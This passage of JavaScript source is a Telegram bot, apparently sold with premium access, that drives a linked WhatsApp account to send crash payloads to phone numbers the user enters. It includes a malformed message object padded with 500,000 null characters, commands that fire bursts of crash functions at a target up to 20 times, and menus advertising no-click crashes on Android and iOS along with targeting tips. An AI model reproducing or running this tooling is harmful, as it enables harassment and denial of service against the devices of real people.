- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userId;
    const args = ctx.message.text.split(" ");

    // Check if command is reply to a message
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } else {
        // Manual ID input if not reply
        if (args.length < 2) {
            return await ctx.reply(`
 ╭═══════『 𝐀𝐝𝐝 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
 │
 ├─────『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』
 │ • Reply pesan user + ketik /addadmin
 │ • /addadmin <id_user>
 │
 ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
 │ • Reply pesan + /addadmin
 │ • /addadmin 123456789
 │
 ╰═════════════════════⊱`);
        }
        userId = args[1];
    }

    // Check if already admin
    if (adminList.includes(userId)) {
        return await ctx.reply(`
 ╭═══════『 𝐆𝐚𝐠𝐚𝐥 』═══════⊱
 │
 ├─────『 𝐈𝐧𝐟𝐨 』
 │ • User sudah menjadi admin
 │ • ID: ${userId}
 │
 ╰═════════════════════⊱`);
    }

    try {
        // Add as admin
        addAdmin(userId);

        // Get user information if available
        let userInfo = "";
        if (ctx.message.reply_to_message) {
            const username = ctx.message.reply_to_message.from.username;
            const firstName = ctx.message.reply_to_message.from.first_name;
            userInfo = `- *Username:* ${username ? '@' + username : 'Tidak ada'}\n- *Nama:* ${firstName || 'Tidak diketahui'}\n`;
        }

        const successMessage = `
 ╭═══════『 𝐀𝐝𝐦𝐢𝐧 𝐀𝐝𝐝𝐞𝐝 』═══════⊱
 │
 ├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
 │ - *ID:* ${userId}
 ${userInfo}│ - *Status:* Admin Active ✅
 │
 ├─────『 𝐀𝐜𝐜𝐞𝐬𝐬 』
 │ • /addprem command
 │ • /delprem command
 │ • Premium management
 │
 ╰═════════════════════⊱`;

        await ctx.replyWithMarkdown(successMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "📋 ADMIN LIST",
                        callback_data: "listadmin"
                    }]
                ]
            }
        });

    } catch (error) {
        console.error("Error in addadmin:", error);
        await ctx.reply("❌ Terjadi kesalahan saat menambahkan admin. Silakan coba lagi.");
    }
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{
                    text: "ℹ️ Daftar Admin",
                    callback_data: "listadmin"
                }]
            ]
        }
    });
});

// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Maaf, Anda tidak memiliki akses untuk melihat daftar admin.");
    }

    const adminListString = adminList.length > 0 ?
        adminList.map(id => `- ${id}`).join("\n") :
        "Tidak ada admin yang terdaftar.";

    const message = `
ℹ️ Daftar Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userId, durationDays;
    const args = ctx.message.text.split(" ");

    // Check if command is a reply to a message
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
        durationDays = parseInt(args[1]);

        if (!durationDays || isNaN(durationDays) || durationDays <= 0) {
            return await ctx.reply("❌ Format perintah salah.\n\nGunakan:\n- Reply: /addprem <durasi_hari>\n- Manual: /addprem <id_user> <durasi_hari>");
        }
    } else {
        // Manual ID input
        if (args.length < 3) {
            return await ctx.reply("❌ Format perintah salah.\n\nGunakan:\n- Reply: /addprem <durasi_hari>\n- Manual: /addprem <id_user> <durasi_hari>");
        }

        userId = args[1];
        durationDays = parseInt(args[2]);

        if (isNaN(durationDays) || durationDays <= 0) {
            return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
        }
    }

    try {
        // Add premium user
        addPremiumUser(userId, durationDays);

        const expirationDate = premiumUsers[userId].expired;
        const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss')
            .tz('Asia/Jakarta')
            .format('DD-MM-YYYY HH:mm:ss');

        // Get user information if available
        let userInfo = "";
        if (ctx.message.reply_to_message) {
            const username = ctx.message.reply_to_message.from.username;
            const firstName = ctx.message.reply_to_message.from.first_name;
            userInfo = `- *Username:* ${username ? '@' + username : 'Tidak ada'}\n- *Nama:* ${firstName || 'Tidak diketahui'}\n`;
        }

        const successMessage = `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 』═══════⊱
│
├─────『 𝐔𝐬𝐞𝐫 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ - *ID User:* ${userId}
${userInfo}│ - *Status:* Premium Active ✅
│ - *Durasi:* ${durationDays} hari
│ - *Expired:* ${formattedExpiration} WIB
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Akses ke semua fitur premium
│ • Priority support
│ • Unlimited penggunaan
│
╰═════════════════════⊱

📝 *Note:* Gunakan /help untuk melihat daftar fitur premium
`;

        await ctx.replyWithMarkdown(successMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "📊 Cek Status Premium",
                        callback_data: `cekprem_${userId}`
                    }],
                    [{
                        text: "📚 Panduan Premium",
                        callback_data: `premium_guide`
                    }]
                ]
            },
            reply_to_message_id: ctx.message.message_id
        });

    } catch (error) {
        console.error("Error in addprem:", error);
        await ctx.reply("❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.");
    }
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Premium User *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
    const processMessage = `
⚡ AxèrtáBot Project ⚡
╔══════════════════
║ 🎯 TARGET: +${target.split('@')[0]}
║ ⚔️ STATUS: INITIALIZING...
╚══════════════════`;

    try {
        await ctx.reply(processMessage);
    } catch (error) {
        console.error('Process error:', error);
    }
};

const donerespone = async (target, ctx) => {
    const successMessage = `
⚡ AxèrtáBot Project ⚡
╔══════════════════ 
║ 🎯 TARGET: +${target.split('@')[0]}
║ ✨ STATUS: ATTACK SUCCESS
╚══════════════════`;

    try {
        await ctx.reply(successMessage);
    } catch (error) {
        console.error('Response error:', error);
    }
};

const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};

const QBug = {
    key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
    },
    message: {
        interactiveResponseMessage: {
            body: {
                text: "Sent",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                version: 3
            }
        }
    }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

// --- Command /crash (Placeholder for your actual crash functions) ---
// Helper function to format phone number
function formatPhoneNumber(number) {
    // Remove all non-numeric characters
    let cleaned = number.replace(/[^0-9]/g, '');

    // Remove leading '+' if exists
    cleaned = cleaned.replace(/^\+/, '');

    // If number starts with '0', replace it with '62'
    if (cleaned.startsWith('0')) {
        cleaned = '62' + cleaned.slice(1);
    }

    // If number doesn't start with '62', add it
    if (!cleaned.startsWith('62')) {
        cleaned = '62' + cleaned;
    }

    return cleaned;
}
// Fungsi untuk format nomor yang lebih robust
function formatPhoneNumber(number) {
    // Hapus semua karakter non-digit
    let cleaned = number.replace(/[^0-9]/g, '');

    // Hapus awalan +
    cleaned = cleaned.replace(/^\+/, '');

    // Jika dimulai dengan 0, ganti dengan 62
    if (cleaned.startsWith('0')) {
        cleaned = '62' + cleaned.slice(1);
    }

    // Jika belum ada 62, tambahkan
    if (!cleaned.startsWith('62')) {
        cleaned = '62' + cleaned;
    }

    return cleaned;
}

// Enhanced command handlers
// Fungsi untuk format nomor yang lebih robust
function formatPhoneNumber(number) {
    // Hapus semua karakter non-angka
    let cleaned = number.replace(/[^0-9]/g, '');

    // Hapus awalan +
    cleaned = cleaned.replace(/^\+/, '');

    // Jika dimulai dengan 0, ganti dengan 62
    if (cleaned.startsWith('0')) {
        cleaned = '62' + cleaned.slice(1);
    }

    // Jika belum ada 62, tambahkan
    if (!cleaned.startsWith('62')) {
        cleaned = '62' + cleaned;
    }

    return cleaned;
}
//Function NusantaraV1
bot.command("crott", checkWhatsAppConnection, checkPremium, async ctx => {
    const userId = ctx.from.id;

    // Cek dulu nih usernya lagi cooldown apa ngga
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.reply(`
 ╭═══════『 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 』═══════⊱
 │
 ├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
 │ • Status: Masih Cooldown ⏳
 │ • Tunggu: ${cooldownStatus.remainingTime} detik lagi
 │
 ├─────『 𝐍𝐨𝐭𝐞 』
 │ • Sabar ya, tunggu dulu
 │ • Biar ga error sistemnya
 │
 ╰═════════════════════⊱`);
    }

    // Misahin perintah jadi beberapa bagian
    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        return await ctx.reply(`
 ╭═══════『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』═══════⊱
 │
 ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
 │ • /crott 628xxx 5    (Ngirim 5x)
 │ • /crott 628xxx 10   (Ngirim 10x)
 │ • /crott 628xxx      (Auto 8x)
 │
 ├─────『 𝐏𝐞𝐧𝐭𝐢𝐧𝐠 』
 │ • Bisa pake 0/62/+62
 │ • Max ngirim: 20x ya
 │
 ╰═════════════════════⊱`);
    }

    // Ambil nomor HP sama berapa kali mau ngirim
    const nomorHP = args[1];
    let jumlahKirim = args[2] ? parseInt(args[2]) : 8; // Kalo ga diisi, otomatis 8x

    // Cek jumlah kirimnya masuk akal apa ngga
    if (isNaN(jumlahKirim) || jumlahKirim < 1 || jumlahKirim > 20) {
        return await ctx.reply("❌ Woy! Kebanyakan! Max 20x aja ya!");
    }

    // Format nomornya biar bener
    const nomorFix = formatPhoneNumber(nomorHP);
    let target = nomorFix + "@s.whatsapp.net";

    // Kasih tau kalo prosesnya udah mulai
    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());

    // Mulai ngirim bug sesuai jumlah yang diminta
    for (let i = 0; i < jumlahKirim; i++) {
        await OverloadCursor(target, ptcp = true);
        await newLoaudFast(target, ptcp = true);
        await crashhcursor(target, ptcp = true);
        await overloadButton(target, ptcp = true);
        await Combox(target, ptcp = true);
        await OverloadCursor(target, ptcp = true);
        await newLoaudFast(target, ptcp = true);
        await crashhcursor(target, ptcp = true);
        await overloadButton(target, ptcp = true);
    }

    // Kasih tau kalo udah selesai
    await donerespone(target, ctx);
});

// Command cursoriosv1
bot.command("cursoriosv1", checkWhatsAppConnection, checkPremium, async ctx => {
    const userId = ctx.from.id;

    // Cek dulu nih usernya lagi cooldown apa ngga
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.reply(`
╭═══════『 𝐖𝐚𝐢𝐭 𝐃𝐮𝐥𝐮 𝐁𝐫𝐨! 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Masih Cooldown ⏳
│ • Tunggu: ${cooldownStatus.remainingTime} detik
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Santuy dulu bang, tunggu bentar
│ • Biar ga error sistemnya
│
╰═════════════════════⊱`);
    }

    // Ambil inputan dari pesan
    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        return await ctx.reply(`
╭═══════『 𝐓𝐮𝐭𝐨𝐫𝐢𝐚𝐥 𝐏𝐚𝐤𝐞 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /cursoriosv1 628xxx 5    (Gas 5x)
│ • /cursoriosv1 628xxx 10   (Gas 10x)
│ • /cursoriosv1 628xxx      (Auto 8x)
│
├─────『 𝐈𝐧𝐟𝐨 𝐓𝐚𝐦𝐛𝐚𝐡𝐚𝐧 』
│ • Bisa pake 0/62/+62 
│ • Max ngirim: 20x
│ • Khusus buat iPhone/iOS
│ • Bug cursor ampuh poll! 🎯
│
╰═════════════════════⊱`);
    }

    // Ambil nomor HP sama berapa kali mau ngirim
    const nomorHP = args[1];
    let jumlahKirim = args[2] ? parseInt(args[2]) : 8; // Default 8x kalo ga diisi

    // Cek jumlahnya masuk akal ga
    if (isNaN(jumlahKirim) || jumlahKirim < 1 || jumlahKirim > 20) {
        return await ctx.reply(`
╭═══════『 𝐄𝐫𝐫𝐨𝐫 𝐁𝐫𝐨! 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Kebanyakan boss!
│ • Max 20x aja ya
│ • Biar HP target ga meledak 😅
│
╰═════════════════════⊱`);
    }

    // Format nomornya biar bener
    const nomorFix = formatPhoneNumber(nomorHP);
    let target = nomorFix + "@s.whatsapp.net";

    // Kasih tau proses dimulai
    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());

    // Gas kirim bug sesuai jumlah
    for (let i = 0; i < jumlahKirim; i++) {
        await OverloadCursor(target, ptcp = true);
        await OverloadCursor(target, ptcp = true); // Double hit biar makin ampuh
    }

    // Kasih tau kalo udah beres
    await donerespone(target, ctx);
});

// Command iosv1
bot.command("iosv1", checkWhatsAppConnection, checkPremium, async ctx => {
    const userId = ctx.from.id;

    // Cek cooldown
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.reply(`
  ╭═══════『 𝐒𝐚𝐛𝐚𝐫 𝐃𝐮𝐥𝐮! 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Cooldown ⏳
  │ • Tunggu: ${cooldownStatus.remainingTime} detik
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Tunggu cooldown selesai ya
  │
  ╰═════════════════════⊱`);
    }

    // Split pesan
    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        return await ctx.reply(`
  ╭═══════『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』═══════⊱
  │
  ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
  │ • /iosv1 628xxx 5    (5x kirim)
  │ • /iosv1 628xxx 10   (10x kirim) 
  │ • /iosv1 628xxx      (Auto 8x)
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Support 0/62/+62
  │ • Max kirim: 20x
  │
  ╰═════════════════════⊱`);
    }

    const nomorHP = args[1];
    let jumlahKirim = args[2] ? parseInt(args[2]) : 8;

    if (isNaN(jumlahKirim) || jumlahKirim < 1 || jumlahKirim > 20) {
        return await ctx.reply("❌ Max 20x kirim ya!");
    }

    const nomorFix = formatPhoneNumber(nomorHP);
    let target = nomorFix + "@s.whatsapp.net";

    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());

    for (let i = 0; i < jumlahKirim; i++) {
        await OverloadCursor(target, ptcp = true);
        await OverloadCursor(target, ptcp = true);
    }

    await donerespone(target, ctx);
});

// Command NusantaraV2
bot.command("dayyum", checkWhatsAppConnection, checkPremium, async ctx => {
    const userId = ctx.from.id;

    // Cek cooldown
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.reply(`
  ╭═══════『 𝐒𝐚𝐛𝐚𝐫 𝐃𝐮𝐥𝐮! 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Cooldown ⏳
  │ • Tunggu: ${cooldownStatus.remainingTime} detik
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Cooldown dulu bro
  │
  ╰═════════════════════⊱`);
    }

    // Split pesan
    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        return await ctx.reply(`
  ╭═══════『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』═══════⊱
  │
  ├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
  │ • /dayyum 628xxx 5    (5x hit)
  │ • /dayyum 628xxx 10   (10x hit)
  │ • /dayyum 628xxx      (Auto 8x)
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Support 0/62/+62
  │ • Max hit: 20x
  │
  ╰═════════════════════⊱`);
    }

    const nomorHP = args[1];
    let jumlahKirim = args[2] ? parseInt(args[2]) : 8;

    if (isNaN(jumlahKirim) || jumlahKirim < 1 || jumlahKirim > 20) {
        return await ctx.reply("❌ Maksimal 20x hit ya!");
    }

    const nomorFix = formatPhoneNumber(nomorHP);
    let target = nomorFix + "@s.whatsapp.net";

    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());

    // Double hit untuk efek maksimal
    for (let i = 0; i < jumlahKirim; i++) {
        await OverloadCursor(target, ptcp = true);
        await OverloadCursor(target, ptcp = true);
        await DorVip1 (target, ptcp = true);
        await DorVip2 (target, ptcp = true);
        await DorVip3 (target, ptcp = true);
        await DorVipIP1 (target, ptcp = true);
    }

    await donerespone(target, ctx);
});

bot.start(async (ctx) => {
    // Mengirim status "mengetik"
    await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

    // Periksa status koneksi, owner, admin, dan premium
    const isPremium = isPremiumUser(ctx.from.id);
    const isAdminStatus = isAdmin(ctx.from.id);
    const isOwnerStatus = isOwner(ctx.from.id);

    const mainMenuMessage = `
   ╭═══════『 𝐍𝐔𝐒𝐀𝐍𝐓𝐀𝐑𝐀 』═══════⊱
   ┃ ⚡ *𝐂𝐫𝐞𝐚𝐭𝐨𝐫*: 
   ┃ 🚀 *𝐕𝐞𝐫𝐬𝐢𝐨𝐧*: Beta Version 1.0
   ┃ ⭐ *𝐀𝐝𝐦𝐢𝐧*: ${isAdminStatus ? '✅' : '❌'}
   ┃ 💎 *𝐏𝐫𝐞𝐦𝐢𝐮𝐦*: ${isPremium ? '✅' : '❌'}
   ┃ 📱 *𝐓𝐲𝐩𝐞*: AxèrtáBot Crasher
   ╰═════════════════════⊱
   
   ╭═══════『 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 』═══════⊱
   ┃ ❯ *Allah SWT*
   ┃ ❯ *Kedua Orang Tua*
   ┃ ❯ *All Developer*
   ┃ ❯ *All Supporter*
   ╰═════════════════════⊱
   
   ╭═══════『 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
   ┃ 📊 *Project*: Beta Testing
   ┃ 🛡️ *Protection*: Active
   ┃ ⚠️ *Mode*: Stable Release
   ╰═════════════════════⊱
   
   *"Sudah Keras Kah Wa Mu?"*
   *© 2024 AxèrtáBot Crasher Beta Version - *
   `;

    const mainKeyboard = [
        [{
            text: "✨ AxèrtáBot🚀",
            url: "https://t.me/AxèrtáBot crasher"
        }],
        [{
            text: "🛡️ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐌𝐞𝐧𝐮",
            callback_data: "developercmd"
        }],
        [{
                text: "💫 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
                callback_data: "bugmenu"
            },
            {
                text: "⚡ 𝐀𝐝𝐦𝐢𝐧 𝐌𝐞𝐧𝐮",
                callback_data: "adminmenu"
            }
        ],
        [{
            text: "📃 𝐒𝐭𝐚𝐭𝐮𝐬 & 𝐈𝐧𝐟𝐨",
            callback_data: "statusinfo"
        }]
    ];

    // Mengirim pesan setelah delay 1 detik
    setTimeout(async () => {
        await ctx.replyWithPhoto("https://files.catbox.moe/eccl6c.jpeg", {
            caption: mainMenuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    }, 1000);
});

// Handler untuk callback "owner_management"
bot.action('developercmd', async (ctx) => {
    try {
        await ctx.deleteMessage();
    } catch (error) {
        console.error("Error deleting message:", error);
    }

    const mainMenuMessage = `
╔════『 AxèrtáBot 』════⊳
║
╠══『 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐂𝐎𝐍𝐒𝐎𝐋𝐄 』
║
║⚡ /addadmin  »  System Admin Control
║🛡️ /deladmin  »  Remove Admin Access
║📊 /cekusersc »  System Usage Monitor
║👁️ /monitoruser » User Activity Track
║📱 /addpairing » Connect WhatsApp
║⚠️ /maintenance » System Lock
║⚠️ /removeallbot » Remove Bot / Sender
║
╠══『 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒 』
║ • Mode: ACTIVE ✅
║ • Security: ENABLED 🔒
║ • Access: RESTRICTED ⚠️
║
╚═════════════════════⊳
AxèrtáBot🚀 | `;

    const mainKeyboard = [
        [{
            text: "⚡ REFRESH CONSOLE",
            callback_data: "developercmd"
        }],
        [{
            text: "🔒 RETURN TO SYSTEM",
            callback_data: "main_menu"
        }]
    ];

    await ctx.replyWithPhoto("https://files.catbox.moe/eccl6c.jpeg", {
        caption: mainMenuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: mainKeyboard
        }
    });
});

bot.action('adminmenu', async (ctx) => {
    try {
        await ctx.deleteMessage();
    } catch (error) {
        console.error("Error deleting message:", error);
    }

    const mainMenuMessage = `
╔════『 AxèrtáBot 』════⊳
║
╠══『 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 』
║
║💠 /addprem  »  Grant Premium Power
║⛔ /delprem  »  Revoke Premium Access
║
╠══『 𝐀𝐂𝐂𝐄𝐒𝐒 𝐋𝐄𝐕𝐄𝐋 』
║ • Authority: ADMIN CLASS
║ • Clearance: HIGH PRIORITY
║ • Commands: PREMIUM CONTROL
║
╚═════════════════════⊳
AxèrtáBot🚀 | `;

    const mainKeyboard = [
        [{
            text: "⚡ REFRESH ACCESS",
            callback_data: "adminmenu"
        }],
        [{
            text: "🔒 SECURE EXIT",
            callback_data: "main_menu"
        }]
    ];

    await ctx.replyWithPhoto("https://files.catbox.moe/eccl6c.jpeg", {
        caption: mainMenuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: mainKeyboard
        }
    });
});

bot.action('bugmenu', async (ctx) => {
    const isPremium = isPremiumUser(ctx.from.id);
    const isAdminStatus = isAdmin(ctx.from.id);
    const isOwnerStatus = isOwner(ctx.from.id);

    const mainMenuMessage = `
  ╭═══════『 𝐍𝐔𝐒𝐀𝐍𝐓𝐀𝐑𝐀 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 』═══════⊱
  │
  ├─────『 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 』
  │ • /crott ⚡
  │   ├ Tipe: No-Click Universal
  │   ├ Target: All Android
  │   ├ Impact: 97% Brutal
  │   └ Status: Perfect Hit ✅
  │
  │ • /dayyum 🔥 
  │   ├ Tipe: CNC + Brutal Mode
  │   ├ Target: Android Latest
  │   ├ Impact: 95% Hard
  │   └ Status: Working ✅
  │
  ├─────『 𝐈𝐎𝐒 𝐁𝐔𝐆𝐒 』
  │ • /iosv1 💫
  │   ├ Tipe: iOS Base Crash
  │   ├ Target: iOS 14+
  │   ├ Impact: 90% Strong
  │   └ Status: Working ✅
  │
  │ • /cursoriosv1 ⚔️
  │   ├ Tipe: Cursor + CNC
  │   ├ Target: All iOS
  │   ├ Impact: 93% Perfect
  │   └ Status: Working ✅
  │
  ├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
  │ • Premium: ${isPremium ? '✅ Active' : '❌ Not Active'}
  │ • Cooldown: ${bugCooldown} detik
  │ • Version: 3.0 Stable Release
  │
  ├─────『 𝐈𝐍𝐅𝐎 』
  │ • /help untuk bantuan
  │ • Max 20x kirim per cmd
  │ • Premium only commands
  │
  ╰═════════════════════⊱
  
  *© 2024 AxèrtáBot 🚀*`;

    const mainKeyboard = [
        [{
                text: "⚡ ANDROID GUIDE",
                callback_data: "android_guide"
            },
            {
                text: "📱 IOS GUIDE",
                callback_data: "ios_guide"
            }
        ],
        [{
            text: "💎 PREMIUM ACCESS",
            callback_data: "premiuminfo"
        }],
        [{
            text: "🏠 BACK TO MENU",
            callback_data: "main_menu"
        }]
    ];

    try {
        await ctx.deleteMessage();
        await ctx.replyWithPhoto("https://files.catbox.moe/eccl6c.jpeg", {
            caption: mainMenuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    } catch (error) {
        await ctx.reply(mainMenuMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    }
});

bot.action('android_guide', async (ctx) => {
    const guideMessage = `
╭═══════『 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐆𝐮𝐢𝐝𝐞 』═══════⊱
│
├─────『 𝐁𝐞𝐬𝐭 𝐏𝐫𝐚𝐜𝐭𝐢𝐜𝐞𝐬 』
│ • Use crott for older Android
│ • Use dayyum for Android 13+
│ • Wait cooldown between attacks
│ • Verify target's Android version
│
├─────『 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐓𝐢𝐩𝐬 』
│ • Best time: When target is online
│ • Recommended: 2-3 hits per target
│ • Avoid spam to prevent block
│
╰═════════════════════⊱`;

    try {
